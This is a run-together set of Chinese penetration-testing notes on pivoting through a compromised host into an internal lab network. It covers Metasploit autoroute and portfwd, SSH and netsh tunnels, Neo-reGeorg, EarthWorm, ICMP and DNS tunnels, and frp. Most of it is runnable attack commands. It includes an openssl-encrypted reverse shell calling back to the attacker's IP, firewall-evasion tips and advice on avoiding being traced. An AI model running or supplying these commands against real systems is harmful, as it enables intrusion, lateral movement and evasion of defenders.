pivotiing（派我听）和自动路由黑客（192.168.152.130）--------（192.168.1.185）ser1（172.16.214.142）------（172.16.214.134）ser2内网--外网（不在同一网段，无法访问一些页面如企业OA等页面）run get_local_subnets收集子网信息设置静态路由run autoroute -s 172.16.214.0/24(目标ip，24位，每个数代表8位）查看是否添加成功run autoroute -p利用被入侵的主机作为跳板攻击其他主机扫描内网run post/windows/gather/arp_scanner RHOSTS=172.16.214.0/24使用socks代理1、use auxiliary/server/socks_proxyshow options(举例）srvhost 127.0.0.1srvport  10044version  4arun2、编辑/etc/proxychains4.confsocks4 127.0.0.1 10044 (流量走这个端口）3、命令打开火狐进行内网访问proxychains firefoxproxychains(相当于进入内网后的主机）proxychains nmap ip黑客（192.168.152.130）--------（192.168.1.185）ser1（172.16.214.142）------（172.16.214.134）ser2(28条消息) 端口映射和端口转发的区别（一个菜比的理解）_Mhyer的博客-CSDN博客_端口映射和端口转发的区别端口转发和映射，两种不同的实现方式，来实现相同的目的拿到主机shell后，meterpreter端口映射1、portfwd flush（清空规则）2、portfwd add -L 192.168.152.130(黑客ip） -l 2020（黑客端口） -p 80（目标端口）-r 172.16.214.141（中间人）192.168.152.130:2020<---->172.16.214.141:80端口转发1、portfwd flush（清空规则）2、portfwd add -l 5555 -p 3389 -r 172.16.214.1413、rdesktop 127.0.0.1:5555 (开启远程桌面）（本地连接kali--kali通过ser1转发到ser2--步步渗透）--破解自己的5555端口，就是破解对方密码黑客（192.168.152.130）--------（192.168.1.185）ser1（172.16.214.142）------（172.16.214.134）ser2ssh隧道正向隧道1、中间人上设置映射ssh -CNfL 0.0.0.0:7777:172.16.214.134:80 root@127.0.0.1password:本机密码反向隧道（越过一些防火墙规则）1、ssh -qTfnN -R 2222:127.0.0.1:22 root@192.168.152.130(把本地的22端口映射到黑客的2222端口）2、黑客主机ssh -p 2222 root@127.0.0.1(黑客连接自己的2222端口）建立反向隧道时，建议使用小权限用户，防止反追踪本地socket5代理---海外socket5一般用来翻墙1、黑客主机,开启socket5ssh -qTfnN -D 7070 root@192.168.1.185password(ser1)2、浏览器设置socket5代理ssh本地转发访问1、黑客主机ssh -L (可以写0.0.0.0:,也可以不写）6666:172.16.214.134:80 root@192.168.1.182 -fNpassword(ser1)2、ps aux | grep 6666进程测试ssh远程转发访问（属于反向连接，有利于滤过防火墙）状态---ser1与ser2都被拿下，但发现ser2里面有更深层次的网络1、修改ser1的ssh配置nano /etc/ssh/ssh_configGatewayPorts yes 2、ser2上操作ssh -R 8877:172.16.214.134:80 root@192.168.1.185openssl反弹加密1、黑客主机生成字签名证书openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes监听端口openssl  s_server -quiet -key key.pem -cert cert.pem -port 80802、ser1mkfifp /tmp/s;bin/sh -i /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.1.186:8080 > /tmp/s;rm /tmp/s（类似nc的反弹加密）防止其他人监控流量netsh端口映射1、ser1的powershellnetsh interface portproxy add v4tov4(ipv4对应ipv4） listenport=7777 connectaddress=172.16.214.141 connectport=802、show all 查看设置3、干掉设置netsh interface portproxy resetnetsh进行msf代理1、生成连接ser1的木马 lhost=172.16.214.1402、监听黑客ip与端口3、ser1将信息转发到黑客ip端口netsh interface portproxy add v4tov4(ipv4对应ipv4） listenport=4455 connectaddress=192.168.1.186 connectport=4455黑客（192.168.1.186）--------（192.168.1.231）ser1（172.16.214.140）------（172.16.214.141）ser2neo-regreg代理（脚本设置代理）neo-regreg下载1、操作命令python neoreg.py generate -k mima123(k后设置密码）生成密码为mima123的脚本2、连接python neoreg.py generate -k mima123 -u url成功建立隧道修改proxychains_configsocket5 127.0.0.1:1080earthworm代理正向代理1、把对应文件复制到ser1ew_for_Win.exe -s ssocksd -l 88882、黑客主机nano /etc/proxychainssocks5 192.168.1.231 88883、代理命令操作反向代理（ser2有更深层次的网络）1、ser1ew -s rcsocks -l 1080 -e 10242、ser2ew -s rssocks -d 172.16.214.140 -e 1024黑客（192.168.1.186）--------（192.168.1.185）ser1（172.16.214.142）------（172.16.214.141）ser2icmp隧道（ping包流量，防火墙基本不会注意）1、在ser1装ptunnelapt-get install ptunnel2、黑客主机ptunnel -p 192.168.1.185 -lp 8080 -da 172.16.214.141 -dp 80 -x 1234(密码）dns隧道(突破防火墙）黑客访问中间人 中间人和目标进行dns通信dns2tcpd-F    强制后台运行，默认在后台-i    监听ip，默认0.0.0.0-f    配置文件-d    debug级别dns2tcpc-c    启用压缩-z    指定使用域名-d    调试级别（1，2，3）-r    访问目标资源-f    配置文件路径-l    本地监听端口-T    DNS请求类型，默认TXT在vps服务商把udp53号端口打开（出和入），使用dns.xxx.com的A记录指向ser1的ip1、ser1与黑客主机apt-get install dns2tcp2、ser13、黑客主机dns2tcpc -r ssh -k haha123 -z dns.xxx.com 192.168.1.185 -l 8888 -c -d 3 ssh -p 8888 127.0.0.1password(-k haha123)frp内网穿透（用的非常多）ser1=frp serverser2=frp client1、黑客主机nano frps.inibind_port=7000token=haha123chmod +x ./frps./frps -c frps.inifrps -c frps.ini (启动frp的服务端）2、ser1nano frpc.ini{server_addr=172.16.214.142token=haha123}frpc -c frpc.ini两边内网的桥梁
